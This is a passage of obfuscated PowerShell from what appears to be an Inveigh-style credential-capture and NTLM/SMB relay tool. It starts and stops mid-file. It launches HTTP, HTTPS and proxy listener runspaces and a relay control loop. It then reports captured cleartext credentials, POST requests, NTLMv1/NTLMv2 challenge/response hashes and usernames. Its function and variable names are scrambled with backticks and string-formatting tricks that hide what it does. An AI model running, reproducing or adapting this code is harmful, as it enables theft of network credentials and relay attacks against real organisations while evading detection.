    ${HTTpS_`R`UN`sp`AcE}."sE`SSI`ONS`TA`TEP`RoXY".("{2}{3}{1}{0}" -f'e','l','SetVa','riab').Invoke(("{0}{1}"-f'inve','igh'),${In`Ve`IGH})
    ${h`T`TPS_Po`WErSheLL} =   (  &("{0}{1}"-f 'Gc','I') ('V'+'aR'+'IABLe:m4un') ).vALuE::("{1}{0}" -f 'ate','Cre').Invoke()
    ${hT`T`ps_POw`eRS`hElL}."R`UNsP`ACE" = ${htTpS`_`RuNS`pAcE}
    ${HtTP`S_poweRs`He`ll}.("{2}{0}{1}" -f'ddScri','pt','A').Invoke(${sharE`D_BASiC`_`FuNcT`I`ONS_ScR`I`PtblOck}) > ${Nu`LL}
    ${Ht`TPS`_pOwErS`H`E`lL}.("{0}{1}" -f'AddScr','ipt').Invoke(${p`A`CkET_fuN`CTI`ONs_S`cRi`PT`BLOcK}) > ${N`ULL}
    ${Ht`Tps_Po`we`RshELl}.("{2}{1}{0}" -f'ipt','cr','AddS').Invoke(${smb_RELA`Y_`Fun`c`T`ioNS`_scr`IPTB`LOCk}) > ${n`Ull}
    ${HtTp`S`_p`OWer`sHE`ll}.("{2}{0}{1}" -f 'd','Script','Ad').Invoke(${HTtp_Scri`p`Tb`Lock}).("{2}{0}{1}" -f 'd','dArgument','A').Invoke(${a`TTACK}).("{2}{1}{0}" -f 'ment','u','AddArg').Invoke(${chA`LLE`NGE}).("{0}{2}{1}"-f 'AddArg','t','umen').Invoke(
        ${C`omma`ND}).("{0}{2}{1}" -f 'Ad','gument','dAr').Invoke(${e`Num`ERAte}).("{0}{2}{1}"-f 'AddArg','nt','ume').Invoke(${EN`UM`eratE`grOuP}).("{0}{3}{2}{1}" -f'A','rgument','A','dd').Invoke(${FAiLedlogiN`T`H`ReS`ho`lD}).("{0}{1}{2}" -f'Add','Argum','ent').Invoke(
        ${h`TT`PiP}).("{2}{0}{1}"-f'r','gument','AddA').Invoke(${h`Tt`ps`port}).("{0}{1}{2}" -f'Add','Ar','gument').Invoke(
        ${htTpS_`LiST`En`eR}).("{3}{1}{0}{2}" -f'e','Argum','nt','Add').Invoke(${pRo`XY}).("{2}{3}{0}{1}"-f'en','t','AddA','rgum').Invoke(${Pr`O`xYIG`NoRE}).("{1}{2}{0}" -f't','AddA','rgumen').Invoke(${PRo`x`Y_L`i`StEnER}).("{2}{0}{1}"-f'u','ment','AddArg').Invoke(
        ${re`L`AYAUTO`dISABle}).("{0}{1}{2}{3}"-f'Ad','dArg','ume','nt').Invoke(${re`PEa`T`eNum`ErATE}).("{0}{1}{2}"-f 'AddArg','u','ment').Invoke(${RE`peA`TE`XecUtE}).("{0}{1}{2}" -f 'Ad','dAr','gument').Invoke(
        ${SERvi`Ce}).("{1}{0}{2}"-f 'me','AddArgu','nt').Invoke(${S`m`B_ve`RSION}).("{1}{2}{0}{3}" -f'rgum','A','ddA','ent').Invoke(${SES`S`io`NLimitpriv}).("{3}{2}{1}{0}" -f 'ment','gu','Ar','Add').Invoke(
        ${sEss`i`ONLIMIT`U`NPRiv}).("{0}{1}{3}{2}" -f'AddA','r','nt','gume').Invoke(${SE`sSIoN`L`imitSH`A`RE}).("{1}{2}{0}"-f'nt','A','ddArgume').Invoke(${sESSI`O`NPr`IorI`TY}).("{3}{0}{1}{2}"-f'dArgu','me','nt','Ad').Invoke(
        ${TAr`gET}).("{1}{0}{2}" -f'gum','AddAr','ent').Invoke(${ta`RGeT`MOde}).("{0}{2}{1}" -f'AddArg','t','umen').Invoke(${Ta`RgEt`Ref`REsh}).("{2}{3}{0}{1}"-f 'e','nt','AddA','rgum').Invoke(${U`seRNA`me}).("{0}{1}{2}"-f'AddArgum','en','t').Invoke(
        ${w`pad`Auth}).("{0}{2}{1}"-f'Ad','nt','dArgume').Invoke(${WPADa`UTh`ig`N`Ore}).("{3}{2}{0}{1}" -f 'Arg','ument','d','Ad').Invoke(${wpaD`R`esp`OnSE}) > ${n`Ull}
    ${Ht`Tps_P`OWErSHE`Ll}.("{2}{1}{0}{3}"-f 'n','i','Beg','Invoke').Invoke() > ${Nu`ll}
}


function ProX`y`l`istENEr
{
    ${pRoxY`_r`UN`SPAcE} =  (  &('Ls')  ("var"+"Iable"+":R"+"ko8f0")  ).VALue::("{3}{2}{0}{1}" -f'Runspa','ce','te','Crea').Invoke()
    ${h`Ttps_l`istEN`eR} = ${FaL`sE}
    ${PR`OXY_Li`sT`ener} = ${T`RuE}
    ${PRoX`y`_R`UNsp`ACE}.("{1}{0}"-f 'pen','O').Invoke()
    ${pRO`Xy`_RuN`SPA`Ce}."Se`ssi`ONs`TATeP`RoxY".("{1}{0}{2}" -f'ar','SetV','iable').Invoke(("{1}{0}" -f 'nveigh','i'),${in`Vei`Gh})
    ${pro`xY`_POwers`h`ell} =   ( &("{1}{0}"-f'RiaBlE','Va') ('M4'+'Un') ).Value::("{1}{0}" -f 'e','Creat').Invoke()
    ${P`ROX`y_pOw`Ers`hElL}."RUn`S`pAcE" = ${P`RoXy_`RunSp`ACE}
    ${p`ROXy_Po`wE`RSHelL}.("{1}{2}{0}" -f'pt','Add','Scri').Invoke(${SHa`REd`_bASIC_Fun`CTiONs_`SCri`PtblOCk}) > ${N`ULL}
    ${PROXy_`P`oWerShe`ll}.("{1}{0}{2}{3}"-f'S','Add','c','ript').Invoke(${packeT_fu`NCt`iO`NS_SCRI`pT`B`L`oCk}) > ${NU`Ll}
    ${pROx`Y_`PowER`Sh`eLL}.("{0}{2}{1}"-f 'AddScri','t','p').Invoke(${sm`B_R`elay_FUNCT`iONs_S`c`RiPTb`loCK}) > ${Nu`lL}
    ${pROxy`_`PowERSHE`ll}.("{0}{1}{3}{2}"-f 'Add','S','pt','cri').Invoke(${H`T`T`p_`scrIpTBLOCK}).("{0}{1}{2}" -f 'Ad','dArgum','ent').Invoke(${Att`Ack}).("{1}{2}{0}"-f'ent','A','ddArgum').Invoke(${C`ha`LLEngE}).("{0}{1}{2}" -f 'A','ddArgum','ent').Invoke(
        ${c`OM`MANd}).("{2}{1}{0}" -f'rgument','dA','Ad').Invoke(${e`NUm`ERaTe}).("{3}{1}{2}{0}" -f't','Argu','men','Add').Invoke(${E`NU`mErA`TEGRouP}).("{3}{0}{2}{1}" -f 'Ar','nt','gume','Add').Invoke(${FAIlEdLO`gIN`Thre`Sh`o`Ld}).("{2}{1}{0}" -f 'nt','gume','AddAr').Invoke(
        ${Pr`o`XYIP}).("{2}{0}{1}"-f 'en','t','AddArgum').Invoke(${pr`o`xyPORT}).("{2}{0}{1}" -f 'ddArgum','ent','A').Invoke(
        ${hTtpS`_`Lis`TeN`Er}).("{3}{0}{2}{1}"-f 'Ar','ent','gum','Add').Invoke(${Pro`xy}).("{2}{0}{1}" -f'dd','Argument','A').Invoke(${P`RO`xyIGnOrE}).("{0}{1}{2}"-f 'AddAr','g','ument').Invoke(${p`RO`XY_`LI`stenER}).("{2}{1}{0}" -f't','men','AddArgu').Invoke(
        ${rE`LA`Y`Aut`OdisaBle}).("{2}{1}{0}" -f't','men','AddArgu').Invoke(${REp`E`AtEnumEr`ATE}).("{0}{1}{2}"-f 'A','ddArgu','ment').Invoke(${REpea`T`eXECutE}).("{0}{3}{2}{1}" -f'Ad','nt','rgume','dA').Invoke(
        ${s`eR`Vice}).("{0}{3}{1}{2}" -f 'Add','g','ument','Ar').Invoke(${SM`B_vEr`sI`oN}).("{1}{0}{2}{3}"-f 'dAr','Ad','gu','ment').Invoke(${sE`ssI`OnLIm`iTp`RIv}).("{1}{0}{2}{3}" -f'ddA','A','rgu','ment').Invoke(
        ${S`EssioNLim`i`T`UNPRIv}).("{2}{1}{0}"-f'Argument','dd','A').Invoke(${SEss`io`Nlim`itS`HarE}).("{2}{0}{1}"-f 'men','t','AddArgu').Invoke(${SES`s`IOnP`RIoRitY}).("{0}{3}{2}{1}"-f'AddAr','t','en','gum').Invoke(
        ${tA`RgeT}).("{2}{1}{0}"-f 'ent','gum','AddAr').Invoke(${T`ARgET`MoDE}).("{3}{1}{0}{2}" -f 'u','rg','ment','AddA').Invoke(${TaRgET`REFRE`Sh}).("{1}{2}{3}{0}" -f 'ment','Ad','dA','rgu').Invoke(${U`sEr`NaME}).("{2}{1}{0}{3}"-f'Ar','d','Ad','gument').Invoke(
        ${WPAdau`Th}).("{2}{1}{0}" -f't','men','AddArgu').Invoke(${wpadau`T`hignO`Re}).("{0}{2}{1}"-f'AddAr','ent','gum').Invoke(${wpaDR`ES`PO`NsE}) > ${NU`LL}
    ${PROXY_pOWe`RS`He`lL}.("{0}{2}{1}"-f'B','inInvoke','eg').Invoke() > ${N`Ull}
}


function cOn`T`R`OLRElAyLo`OP
{
    ${coN`TROL`_Rel`Ay_`RU`N`sPACe} =   $Rko8f0::("{3}{2}{1}{0}"-f 'pace','ateRuns','re','C').Invoke()
    ${C`ontroL_`REl`AY_runsp`ACE}.("{1}{0}" -f 'en','Op').Invoke()
    ${CO`NT`Rol`_RElAy_RUns`Pa`cE}."sESSI`o`Ns`TATepROXy".("{1}{0}{2}"-f'tVaria','Se','ble').Invoke(("{1}{0}" -f'eigh','inv'),${I`NVeI`Gh})
    ${c`o`NTROl_REL`A`Y_POwershElL} =   $M4Un::("{1}{0}"-f'eate','Cr').Invoke()
    ${co`NTRo`l_r`elA`Y`_pow`ERSHEll}."run`sP`AcE" = ${C`oNt`ROL_Rela`y_`R`UnsPa`Ce}
    ${conTRO`l`_Relay`_`poWerS`H`ELl}.("{1}{0}{2}" -f 'crip','AddS','t').Invoke(${s`Ha`Red_bASIc`_FUNCt`IONs`_s`cRI`PTbLo`cK}) > ${NU`lL}
    ${C`OnTr`o`l_rEl`Ay_Pow`eR`sHeLL}.("{0}{1}"-f'AddS','cript').Invoke(${A`diD`NS_FuN`CTIo`NS`_sCRIPT`BL`O`CK}) > ${N`ULL}
    ${cOnTro`l`_RE`LaY_POWE`RsHe`Ll}.("{2}{0}{1}"-f'dScr','ipt','Ad').Invoke(${PACKET_`FU`N`ctI`O`Ns`_sC`R`IpTBLoCK}) > ${N`ULl}
    ${co`NT`R`OL_Relay_p`oWe`R`sheLl}.("{1}{2}{0}" -f 't','AddScri','p').Invoke(${sm`B_`ReL`Ay_funCt`ioNs_Sc`R`IPt`BL`Ock}) > ${NU`lL}
    ${controL`_`RE`L`A`y_Powe`RShE`Ll}.("{1}{0}"-f'ddScript','A').Invoke(${co`N`Trol_REL`Ay_`SCrI`ptBLocK}).("{3}{2}{0}{1}"-f'n','t','rgume','AddA').Invoke(${coNsOLE`q`U`EuElIMit}).("{0}{2}{1}" -f'Add','ment','Argu').Invoke(
        ${rElAY`Au`TOexIT}).("{3}{2}{1}{0}"-f'ument','rg','dA','Ad').Invoke(${R`Un`TiME}) > ${NU`LL}
    ${C`ON`TRoL_r`e`LAy_Po`wERsh`e`Ll}.("{1}{0}{2}" -f'e','B','ginInvoke').Invoke() > ${n`Ull}
}


function SesSIo`Nre`FR`ESHlOoP
{
    ${SESSio`N_R`e`FREsH`_RUn`SP`AcE} =   (&("{2}{0}{1}"-f 'ILdI','TEM','gET-cH')  ("VarIaBl"+"E:RK"+"O8f"+"0")  ).vAlue::("{0}{3}{1}{2}" -f 'C','at','eRunspace','re').Invoke()
    ${s`es`si`o`N_reFRes`H`_`RUnSpaCe}.("{0}{1}" -f 'Op','en').Invoke()
    ${seSsio`N_rEf`R`Es`H`_ruNsPAcE}."s`Es`siONS`TatEProXy".("{1}{0}{2}{3}"-f'tVar','Se','iabl','e').Invoke(("{0}{1}" -f'i','nveigh'),${INvE`i`GH})
    ${S`eSs`i`on_Ref`ReSH`_POweRSHELl} =  (&("{1}{0}" -f'R','dI')  ('v'+'a'+'riabLE:M4UN') ).VALuE::("{1}{2}{0}"-f 'e','C','reat').Invoke()
    ${sES`sIo`N_rEFRes`h_P`OwERSHelL}."ru`NSpa`ce" = ${sEsSio`N_REfr`e`Sh_`RuN`sPaCE}
    ${S`ESsI`o`N`_R`EfREsh`_poWeRsH`ell}.("{0}{1}{2}" -f'A','ddS','cript').Invoke(${S`H`AReD`_BasIc_FuNctions_`sCR`iPt`BLoCk}) > ${N`ULl}
    ${s`eSSiOn_R`efre`sH_POwErSHE`ll}.("{0}{2}{1}"-f 'A','t','ddScrip').Invoke(${p`AckET_`FuNcTIo`Ns_S`C`R`i`PtbLOCK}) > ${n`Ull}
    ${SES`SI`on_ref`RES`H_`powERsHelL}.("{2}{1}{0}" -f 'pt','dScri','Ad').Invoke(${sMb_reLa`Y_FUn`cTi`ONs_s`c`RIPtBLOcK}) > ${n`ULl}
    ${sESsio`N`_re`Fres`H_POW`eRsHelL}.("{0}{2}{1}" -f'A','Script','dd').Invoke(${S`eSsIoN_Re`FreSH_`SCRi`pTbl`ocK}).("{2}{0}{1}"-f 'ddArgumen','t','A').Invoke(${S`ESSIo`NreFresh}) > ${N`Ull}
    ${se`S`siOn_rEFRe`sH_poWE`RS`helL}.("{2}{0}{1}"-f 'g','inInvoke','Be').Invoke() > ${N`Ull}
}





if(${HT`TP} -eq 'Y')
{
    &("{3}{2}{0}{1}"-f 'TPListene','r','T','H')
    &("{1}{2}{3}{0}"-f '-Sleep','S','ta','rt') -m 50
}


if(${H`TTpS} -eq 'Y')
{
    &("{2}{1}{0}{3}" -f'ene','st','HTTPSLi','r')
    &("{1}{0}{2}"-f 'l','Start-S','eep') -m 50
}


if(${PRO`Xy} -eq 'Y')
{
    &("{0}{1}{2}" -f'Pr','oxyListe','ner')
    &("{1}{2}{0}" -f 'eep','S','tart-Sl') -m 50
}


&("{0}{4}{2}{3}{1}" -f 'Contro','op','yL','o','lRela')


if(${sessi`oNrE`F`ResH} -gt 0)
{
    &("{3}{1}{2}{0}"-f 'reshLoop','ssi','onRef','Se')
}


try
{

    if(${C`OnsOLeou`T`p`Ut} -ne 'N')
    {

        if(${C`O`Ns`OlEStAtus})
        {    
            ${COn`SolE_sTAT`US_tIM`eO`UT} = &("{0}{2}{1}" -f'New-Time','an','Sp') -Minutes ${CO`N`soLE`stAt`Us}
            ${conso`le_sTaTUS_St`OP`Wa`TCH} =  ( &("{2}{0}{1}"-f '-I','TEM','GET')  ('VarIa'+'b'+'le:1NP')  ).value::("{0}{1}"-f'St','artNew').Invoke()
        }

        :console_loop while((${i`NVE`IGh}."rE`LA`Y_rUnNI`NG" -and ${In`VEi`GH}."cOns`OLe_o`UtpUt") -or (${I`NV`eIgh}."CoN`SoLE_Q`Ue`Ue"."C`OUNt" -gt 0 -and ${iNvEi`gH}."COnS`OlE_O`UtpuT"))
        {

            while(${I`Nv`eIgh}."coNS`O`l`E_QU`Eue"."C`oUnt" -gt 0)
            {

                switch -wildcard (${I`N`VeigH}."c`OnsO`le`_queue"[0])
                {

                    {${_} -like "?`[`!`]*" -or ${_} -like "?`[-`]*"}
                    {

                        if(${inv`Eigh}."outpUT_s`TReA`m_o`NLy")
                        {
                            &("{0}{1}{2}"-f 'Write-Ou','tp','ut')(${in`V`EIgh}."C`ONSOlE`_q`UeuE"[0] + ${in`VEigh}."NewLi`NE")
                        }
                        else
                        {
                            &("{1}{0}{2}" -f 'Warni','Write-','ng')(${in`V`EIGH}."c`oNsOlE`_QUEue"[0])
                        }

                        ${I`NvEIgH}."C`onSole_`q`UEUe".("{2}{0}{1}" -f'oveA','t','Rem').Invoke(0)
                    }

                    {${_} -like ("{0}{3}{1}{6}{2}{4}{5}"-f'*','er','s',' spoof',' di','sabled',' i') -or ${_} -like ("{0}{1}{2}" -f'* loca','l r','equest') -or ${_} -like ("{2}{1}{0}"-f 'eader *','ost h','* h') -or ${_} -like ("{1}{6}{3}{0}{2}{4}{5}" -f'agent re','* ','ceived','ser ',' ','*','u')}
                    {

                        if(${c`oNs`olEOut`P`UT} -eq 'Y')
                        {

                            if(${Inv`EIgh}."outpU`T_s`T`ReaM`_O`Nly")
                            {
                                &("{0}{2}{1}"-f 'Wr','tput','ite-Ou')(${I`NV`Eigh}."coNs`ol`e_q`Ueue"[0] + ${IN`VE`igh}."nE`w`LiNe")
                            }
                            else
                            {
                                &("{0}{2}{3}{1}" -f'Wr','tput','i','te-Ou')(${i`NV`eiGh}."COn`s`OlE_`QuEUE"[0])
                            }

                        }

                        ${IN`VEiGh}."C`oNS`oLe`_QUEue".("{1}{0}{2}" -f'mo','Re','veAt').Invoke(0)
                    } 

                    {${_} -like ("{3}{1}{0}{2}"-f 'ponse se','s','nt','* re') -or ${_} -like ("{1}{0}{2}" -f 'or','* ign','ing *') -or ${_} -like ("{0}{4}{5}{2}{3}{1}"-f'* H',' *',' ','for','TTP*r','equest') -or ${_} -like ("{4}{2}{1}{0}{3}"-f 'o','uest f','y req','r *','* Prox')}
                    {
                    
                        if(${CoNSo`Le`O`UTP`Ut} -ne "Low")
                        {

                            if(${Inv`EI`Gh}."o`UtP`UT_st`REaM_O`N`lY")
                            {
                                &("{1}{3}{2}{0}" -f 't','W','pu','rite-Out')(${inv`E`Igh}."CoNS`OlE_QU`e`Ue"[0] + ${InVe`Igh}."n`ewL`INe")
                            }
                            else
                            {
                                &("{3}{0}{1}{2}"-f 'rite-O','u','tput','W')(${InV`eI`gH}."conSOlE`_Q`Ue`Ue"[0])
                            }

                        }

                        ${iN`VEi`gh}."con`S`olE_QUEUe".("{0}{1}"-f 'Re','moveAt').Invoke(0)
                    } 

                    ("{0}{1}{2}" -f'de','faul','t')
                    {

                        if(${in`Vei`GH}."O`UT`Put_S`TReAM_OnlY")
                        {
                            &("{0}{3}{1}{2}"-f'Writ','Outp','ut','e-')(${INv`eI`gH}."conS`OLe`_q`UE`UE"[0] + ${i`N`VeIGh}."N`e`wLinE")
                        }
                        else
                        {
                            &("{2}{0}{1}{3}"-f 'i','te-Out','Wr','put')(${Inv`E`igH}."Co`Ns`ole`_QUeUE"[0])
                        }

                        ${INVe`igH}."cONsO`le`_`qUEUe".("{2}{0}{1}"-f 'move','At','Re').Invoke(0)
                    }

                }
                
            }

            if(${C`OnsOLeSt`A`TuS} -and ${CONs`OLe_`statu`S`_sTOpwa`TcH}."eLa`psEd" -ge ${ConsoL`E`_sTAT`Us_timeO`UT})
            {
            
                if(${iNvE`I`Gh}."clE`ArTeX`T_l`IsT"."CoU`Nt" -gt 0)
                {
                    &("{2}{0}{1}" -f'-O','utput','Write')(("[*] [$(Get-Date -format s)] Current unique cleartext captures: ") + ${I`NVEigH}."nE`WlInE")
                    ${i`NvEi`GH}."cLeaRtE`x`T`_liSt".("{1}{0}" -f't','Sor').Invoke()
                    ${POsT_R`eqUest_lI`ST_T`e`mp} = ${INVei`GH}."POsT_`REQue`st_`lisT"

                    foreach(${UNIQ`Ue`_`pOst_R`eQUESt} in ${PO`S`T_`REquEs`T_lIsT_`T`EmP})
                    {
                        if(${u`NIqu`e_cL`earText} -ne ${un`i`QUE_cleARteX`T`_L`AsT})
                        {
                            &("{1}{0}{3}{2}" -f'te','Wri','tput','-Ou')(${uNiq`U`e_ClEAr`TEXt} + ${in`VEi`gh}."n`Ewl`INe")
                        }

                        ${UnIQuE_`Cl`eA`Rtext_lasT} = ${uniq`UE`_`c`LearTE`XT}
                    }

                    &("{1}{2}{0}"-f 't-Sleep','St','ar') -m 5
                }
                else
                {
                    &("{1}{0}{2}{3}"-f 'te-','Wri','Out','put')(("[+] [$(Get-Date -format s)] No cleartext credentials have been captured ") + ${i`NveI`Gh}."NeWL`ine")
                }

                if(${iNvE`i`gH}."pOST`_Re`queST_`LISt"."co`UNt" -gt 0)
                {
                    &("{1}{0}{3}{2}" -f 'ri','W','t','te-Outpu')(("[*] [$(Get-Date -format s)] Current unique POST request captures: ") + ${inv`ei`gh}."N`EwLiNE")
                    ${Inv`eI`gH}."Po`ST_ReQUE`sT`_liSt".("{1}{0}"-f'rt','So').Invoke()
                    ${ntl`M`V1`_Lis`T_TEmP} = ${INv`eIgh}."NTl`M`V1_lIsT"

                    foreach(${uniqUE`_ntL`mv1} in ${nt`L`MV1_LIsT_T`Emp})
                    {
                        if(${uNiqU`E_`P`Os`T_R`e`QuEsT} -ne ${unIQue_`PoSt`_`RE`q`UeS`T_laSt})
                        {
                            &("{0}{1}{2}" -f 'W','ri','te-Output')(${un`IQUE`_POsT`_re`qUe`ST} + ${INv`e`IGh}."NewL`inE")
                        }

                        ${u`NiqUE_pos`T`_r`E`quEST_LA`St} = ${U`N`iqUE_`p`ost_R`eQUe`St}
                    }

                    &("{3}{2}{1}{0}" -f'eep','rt-Sl','ta','S') -m 5
                }
            
                if(${iN`V`eiGH}."N`T`Lmv1_L`IST"."c`OUNt" -gt 0)
                {
                    &("{3}{2}{0}{1}"-f 'tpu','t','e-Ou','Writ')(("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures: ") + ${I`Nv`eigh}."New`L`ine")
                    ${iNvE`iGH}."N`Tlmv`1_LiST".("{0}{1}" -f'So','rt').Invoke()
                    ${NTlmV1_uSe`RNAm`e`_`LisT`_`TEMP} = ${I`Nv`eiGH}."Nt`lMV1`_USErNA`ME_Li`ST"

                    foreach(${nTlMv`1_USE`RnaMe} in ${N`TlMv1_uS`eRNAm`E_liST`_Te`mP})
                    {
                        ${UNiQuE_`NtLmv`1`_Ac`cOU`NT} = ${UnI`qUe_nt`lmv1}.("{0}{2}{3}{1}"-f'SubStr','g','i','n').Invoke(0,${U`NIq`U`e_n`Tlmv1}.("{2}{0}{1}"-f 'exO','f','Ind').Invoke(":",(${U`NI`QUE_n`TLmV1}.("{1}{2}{0}" -f'f','In','dexO').Invoke(":") + 2)))

                        if(${UNiqu`E`_ntlMv1_a`cc`Ount} -ne ${uNI`quE_Ntl`Mv1_`Ac`c`OUN`T_lA`sT})
                        {
                            &("{3}{1}{0}{2}"-f 'Ou','ite-','tput','Wr')(${UNIqu`e_`NtLm`V1} + ${IN`VEigh}."N`e`WlINE")
                        }

                        ${u`N`IQUE`_`NtlmV1`_AcCOu`Nt_la`st} = ${unique_`N`TL`mv`1`_A`CcouNT}
                    }

                    ${uNIQ`UE_N`Tl`Mv1_ACcouNT_`lAsT} = ''
                    &("{0}{2}{1}"-f 'S','t-Sleep','tar') -m 5
                    &("{1}{0}{3}{2}"-f'ite-Outp','Wr','t','u')(("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames: ") + ${IN`VE`igH}."Ne`wLi`Ne")
                    ${n`Tlmv1`_u`sEr`NAMe`_L`iSt_T`EMp} = ${INv`e`iGh}."nTlMv1_u`sE`RN`AMe`_li`sT"

                    foreach(${N`Tlmv`1_`US`ErNAMe} in ${n`T`Lmv`1_u`SeRNAme`_LiSt`_`T`emP})
                    {
                        &("{1}{3}{0}{2}" -f'p','Write-O','ut','ut')(${NtlM`V1_`UsE`RnaMe} + ${invE`IGH}."N`E`wlINE")
                    }

                    &("{1}{3}{0}{2}" -f 'rt-Slee','S','p','ta') -m 5
                }
                else
                {
                    &("{1}{2}{0}{3}" -f 'ut','Wr','ite-O','put')(("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured ") + ${iNvE`igh}."newl`ine")
                }

                if(${i`NvE`igh}."ntlmV2_l`I`ST"."cOU`Nt" -gt 0)
                {
                    &("{0}{3}{2}{1}" -f'W','ut','te-Outp','ri')(("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures: ") + ${i`N`Veigh}."NEw`LInE")
                    ${in`VeIGh}."n`T`l`MV2_List".("{1}{0}"-f 'ort','S').Invoke()
                    ${nTLmV2`_l`IS`T_tE`Mp} = ${i`NVE`IGH}."n`TlMV2_`LiST"

                    foreach(${uniQ`U`E_nt`LMv2} in ${ntlMv`2`_lisT_`Te`Mp})
                    {
                        ${UN`iQue_N`T`LMV2_ac`Cou`NT} = ${unIQU`e_`NTlMv2}.("{3}{2}{0}{1}" -f 'trin','g','ubS','S').Invoke(0,${UNIqu`e_NtlM`V2}.("{2}{0}{1}" -f 'de','xOf','In').Invoke(":",(${Un`IQue_Ntl`mv2}.("{0}{1}{2}" -f 'In','de','xOf').Invoke(":") + 2)))

                        if(${unique_N`T`lmv`2_aCcoU`NT} -ne ${UNiquE`_`N`TlmV2`_acCOunT_`laSt})
                        {
                            &("{3}{1}{0}{2}"-f'ut','te-O','put','Wri')(${UN`iQUe_`NtlM`V2} + ${i`Nv`eigH}."N`EwLINe")
                        }

                        ${UniQue`_N`TLmV2_a`c`c`o`U`Nt_last} = ${UNIq`Ue`_n`Tlmv2_ACcouNT}
                    }

                    ${UNiqUE_N`TLMV2`_`ACCOu`NT`_l`ASt} = ''
                    &("{0}{1}{2}" -f'Start-S','le','ep') -m 5
                    &("{2}{0}{1}" -f 'e-Out','put','Writ')(("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames: ") + ${inV`e`IgH}."N`E`wLInE")
                    ${NtLmv`2_U`SErn`A`Me_`LI`ST_`TEmP} = ${InV`e`IgH}."n`TLmv2_uSer`NA`me_lisT"

                    foreach(${nTlmV`2_uSE`R`Name} in ${nTLmV2_U`sE`RNAMe_`lI`st_TEMp})
                    {
                        &("{1}{2}{0}{3}" -f'Out','Wr','ite-','put')(${Nt`lmv`2_uSerNA`ME} + ${InvE`igh}."NeWl`i`Ne")
                    }
                
                }
                else
                {
                    &("{1}{2}{3}{0}" -f 't','Write-Ou','t','pu')(("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured ") + ${iN`Ve`Igh}."NewlI`Ne")
                }

                ${CON`s`O`LE_`status`_`STOpWATCH} =   ( &("{2}{1}{0}" -f 'Iable','ar','V') 1NP ).VaLue::("{2}{1}{0}" -f 'ew','tartN','S').Invoke()

            }

            if(${iNV`E`IgH}."cOnSo`lE_i`NPuT")
            {

                if( ( &("{0}{1}"-f 'd','IR')  variabLe:ag8N9t ).VaLuE::"kEy`AvAIl`ABLe")
                {
                    ${InvEi`gh}."ConSoL`e`_o`U`Tput" = ${f`Al`sE}
                    BREAK ("{0}{3}{1}{2}"-f'con','ole_lo','op','s')
                }
        
            }

            &("{1}{0}{2}" -f 'rt-','Sta','Sleep') -m 5
        }

    }

}
finally
{

    if(${to`Ol} -eq 2)
    {
        ${In`VEIgH}."re`laY_r`U`NNing" = ${fAl`se}
    }

}

}




function st`oP-In`V`EiGH
{


    if(${In`VEI`gh})
    {
        ${iN`V`EigH}."St`OP" = ${t`RUe}
        
        if(${I`Nv`eIGh}."R`UNniNG" -or ${I`NV`EiGh}."relAy_Ru`N`NiNg")
        {
            ${I`NveI`gh}."Co`N`s`oLe_QUEUE".("{0}{1}"-f'Cl','ear').Invoke()
            &("{4}{0}{2}{3}{1}"-f'tch-In','h','ve','ig','Wa') -NoConsoleMessage
        }
        else
        {
            &("{0}{2}{1}"-f'Wri','tput','te-Ou') ("{11}{7}{4}{9}{1}{12}{10}{6}{2}{3}{5}{0}{8}"-f 'on','re no','ng I','nveigh f','There ','uncti','ni','] ','s','a','un','[-',' r')
        }

    }

}

function G`Et`-inVEIGH
{


    [CmdletBinding()]
    param
    ( 
        [parameter(MaNDaTORy=${F`AlsE})][Switch]${C`LeArTE`XT},
        [parameter(MandaTOrY=${fA`l`SE})][Switch]${C`Le`ArTextU`NiqUE},
        [parameter(maNdAtORY=${F`AL`sE})][Switch]${C`OnSOLe},
        [parameter(maNDatOrY=${FA`LSE})][Switch]${A`DID`Ns},
        [parameter(MandaTOry=${faL`se})][Switch]${Adi`dNSfaIL`ED},
        [parameter(maNDAtORY=${f`AlsE})][Int]${KErB`er`ostGt},
        [parameter(mAndAtorY=${f`Al`SE})][Switch]${keRb`er`Osu`seRnamE},
        [parameter(mandaTORy=${F`A`Lse})][Switch]${lea`RninG},
        [parameter(maNdAtORY=${fa`l`sE})][Switch]${l`oG},
        [parameter(MaNdAtOry=${FA`lSe})][Switch]${n`Tl`MV1},
        [parameter(manDaTORy=${f`ALse})][Switch]${n`Tl`MV2},
        [parameter(MAnDAtoRy=${fA`LsE})][Switch]${N`TlMv1`UN`Ique},
        [parameter(mAnDAtory=${f`Al`Se})][Switch]${NTLmv`2uNI`q`Ue},
        [parameter(mAndAToRy=${fa`lSe})][Switch]${N`TLMv1uSer`NAmEs},
        [parameter(MaNdaToRY=${fA`lse})][Switch]${N`TlMV2U`SER`NAM`es},
        [parameter(MAnDATOry=${f`AL`sE})][Switch]${POStr`eqUe`sT},
        [parameter(maNdaTORy=${f`A`LsE})][Switch]${POSt`RE`QUEStU`NIq`Ue},
        [parameter(maNDAtoRy=${f`AL`SE})][Switch]${sess`ioN},
        [parameter(MaNDAToRy=${Fa`lSE})][Switch]${enU`me`RAte},
        [parameter(vALUeFrOmreMaiNIngarGumENTS=${t`RuE})]${I`NvAlid_PAR`AME`TeR}
    )

    if(${c`ON`solE} -or ${psBO`U`Nd`paraME`TerS}."cO`UNT" -eq 0)
    {

        while(${IN`VE`IGH}."co`NsoLe_qU`e`Ue"."c`OUNt" -gt 0)
        {

            if(${in`VE`IGH}."OU`T`PuT_ST`Re`A`m_OnlY")
            {
                &("{0}{2}{1}" -f'Wri','-Output','te')(${iN`VE`IGh}."co`NSoL`E_q`Ue`UE"[0] + ${iN`Ve`iGh}."Ne`WLine")
                ${inv`Ei`GH}."c`on`solE_QUEue".("{0}{1}"-f 'Rem','oveAt').Invoke(0)
            }
            else
            {

                switch -wildcard (${I`NvEi`gH}."C`Ons`oLe_qU`eue"[0])
                {

                    {${_} -like "?`[`!`]*" -or ${_} -like "?`[-`]*"}
                    {
                        &("{0}{2}{1}"-f 'Wr','rning','ite-Wa') ${In`VEI`gH}."con`S`Ole_`Q`UeuE"[0]
                        ${iNvE`i`GH}."cON`S`OLE_q`U`eUE".("{1}{2}{0}"-f't','R','emoveA').Invoke(0)
                    }

                    ("{0}{1}{2}"-f 'de','faul','t')
                    {
